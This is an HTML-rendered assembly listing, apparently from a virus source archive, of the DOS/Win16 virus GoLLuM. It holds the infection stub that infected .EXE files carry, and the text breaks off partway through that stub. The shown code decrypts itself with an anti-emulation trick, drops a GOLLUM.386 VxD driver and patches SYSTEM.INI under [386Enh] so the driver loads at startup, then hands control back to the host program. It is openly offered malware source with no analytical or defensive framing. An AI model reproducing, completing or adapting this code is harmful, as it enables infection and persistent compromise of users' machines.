<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.Win16.Gollum - gollum.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; - -[GOLLUM.ASM - DOS virus code]- - - - - - - - - - - - - - - - - - - -&gt;8</span><span class="sc0">

</span><span class="sc5">I_am_GoLLuM</span><span class="sc0">     </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">para</span><span class="sc0"> </span><span class="sc12">'CODE'</span><span class="sc0">

</span><span class="sc5">Header_Size</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1Ch</span><span class="sc0">
</span><span class="sc5">VxD_File_Size</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">6592</span><span class="sc0">
</span><span class="sc5">Decryptor_Size</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Bilbo_Dead</span><span class="sc0">
</span><span class="sc5">All_Size</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Old_Header</span><span class="sc4">+(</span><span class="sc5">Header_Size</span><span class="sc4">+</span><span class="sc5">VxD_File_Size</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">Assume</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">I_am_GoLLuM</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">I_am_GoLLuM</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">I_am_GoLLuM</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">I_am_GoLLuM</span><span class="sc0">

</span><span class="sc1">;Virus entry point (code inserted intro infected .EXE files)</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">
</span><span class="sc5">GoLLuM_Entry_Point</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">;Get delta offset stored on infection</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">0000h</span><span class="sc0">
        </span><span class="sc1">;Save segment regs</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc1">;Point segment regs to our code</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc1">;Decrypt virus and VxD file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Bilbo_Dead</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">All_Size</span><span class="sc4">-</span><span class="sc5">Decryptor_Size</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc4">)/</span><span class="sc2">02h</span><span class="sc0">
</span><span class="sc5">Decrypt_Gollum</span><span class="sc4">:</span><span class="sc0">
        
        </span><span class="sc1">;Dont let GoLLum be emulated (Meeethyyyl! ;)</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">0002h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">
        </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">Decrypt_Gollum</span><span class="sc0">
        </span><span class="sc1">;Clear prefetch</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0EBh</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc1">;Drop GOLLUM.386 file and insert DEVICE=GOLLUM.386 into SYSTEM.INI</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">
</span><span class="sc5">Bilbo_Dead</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">;Find SYSTEM.INI file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Win_Sys_Table</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0005h</span><span class="sc0">        
        </span><span class="sc6">cld</span><span class="sc0">
</span><span class="sc5">Search_Loop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc1">;Open file (read/write access)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D02h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">Open_Ok</span><span class="sc0">
        </span><span class="sc1">;Try next file name</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">Search_Loop</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Gollum_Leave</span><span class="sc0">
</span><span class="sc5">Open_Ok</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">;Save SYSTEM.INI file handle</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">System_Handle</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc1">;Build VxD file name        </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VxD_File</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
</span><span class="sc5">Copy_Directory</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc3">"."</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Found_Extension</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Copy_Directory</span><span class="sc0">
</span><span class="sc5">Found_Extension</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">;Insert the path separator</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc13">"\"
</span><span class="sc0">        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc1">;Insert the name of the VxD file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Device_String</span><span class="sc4">+</span><span class="sc2">09h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">000Ah</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc1">;Put the null marker</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc1">;Create de VxD file, abort if exist</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">5Bh</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VxD_File</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">Close_Sys</span><span class="sc0">
        </span><span class="sc1">;Write VxD to file</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Old_Header</span><span class="sc4">+</span><span class="sc5">Header_Size</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">VxD_File_Size</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">ok_VxD_Write</span><span class="sc0">
        </span><span class="sc1">;Close VxD file if error...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc1">;...and delete it!</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">41h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VxD_File</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">Close_Sys</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">System_Handle</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Exit_Infection</span><span class="sc0">
</span><span class="sc5">ok_VxD_Write</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">;Get handle of SYSTEM.INI file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">System_Handle</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc1">;Seek to EOF</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">Bad_Size</span><span class="sc0">
        </span><span class="sc1">;Strange! SYSTEM.INI file too big</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Bad_Size</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">VxD_File_Size</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">Size_Ok</span><span class="sc0">
</span><span class="sc5">Bad_Size</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Exit_Infection</span><span class="sc0">
</span><span class="sc5">Size_Ok</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">;Save SYSTEM.INI file size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">System_Size</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc1">;Seek to BOF</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">Bad_Size</span><span class="sc0">
        </span><span class="sc1">;Read SYSTEM.INI over VxD file copy</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">System_Size</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Old_Header</span><span class="sc4">+</span><span class="sc5">Header_Size</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">bad_size</span><span class="sc0">
        </span><span class="sc1">;Check if SYSTEM.INI have been infected</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">System_Size</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc3">"G"</span><span class="sc0">
</span><span class="sc5">Do_Inspect</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">repne</span><span class="sc0"> </span><span class="sc6">scasb</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">System_Clean</span><span class="sc0">
        </span><span class="sc1">;Exit if already resident</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc3">"LO"</span><span class="sc0"> 
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Do_Inspect</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc3">"UL"</span><span class="sc0"> 
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Do_Inspect</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Exit_Infection</span><span class="sc0">
</span><span class="sc5">System_Clean</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">;Search for [386Enh] string</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">System_Size</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">Section_Search</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc3">"3["</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Next_Char</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc3">"68"</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Section_Found</span><span class="sc0">
</span><span class="sc5">Next_Char</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">Section_Search</span><span class="sc0">
        </span><span class="sc1">;Section not found, abort</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Exit_Infection</span><span class="sc0">
</span><span class="sc5">Section_Found</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">;Save distance from [386Enh] string to EOF</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0008h</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">System_Size</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc1">;Seek next to [386Enh] string</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">Exit_Infection</span><span class="sc0">
        </span><span class="sc1">;Write our load string</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0015h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Device_String</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">Exit_Infection</span><span class="sc0">
        </span><span class="sc1">;Write the rest of SYSTEM.INI file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">System_Size</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">Exit_Infection</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">;Close file (bx=handle)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc1">;Get control back to host</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">
</span><span class="sc5">Gollum_Leave</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">;Restore segment registers</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc1">;File SYSTEM.INI not found, return to host</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">62h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">exe_cs</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc1">;Restore stack</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Old_Header</span><span class="sc4">+</span><span class="sc2">0Eh</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Old_Header</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">
        </span><span class="sc1">;Clear some regs</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
